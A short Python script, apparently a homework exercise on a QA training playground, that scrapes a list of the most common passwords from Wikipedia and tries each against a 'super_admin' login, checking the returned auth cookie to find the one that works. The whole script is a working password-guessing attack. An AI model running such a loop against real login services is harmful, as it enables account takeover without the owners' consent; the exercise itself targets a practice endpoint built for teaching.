import requests
from lxml import html

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(), "Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)

for password in passwords:
    password = str(password).strip()

    data = {"login": "super_admin", "password": password}
    response_1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)

    cookie_value = response_1.cookies.get("auth_cookie")
    cookies = {}
    if cookie_value is not None:
        cookies.update({"auth_cookie": cookie_value})

    response_2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)

    if response_2.text != "You are NOT authorized":
        print(password)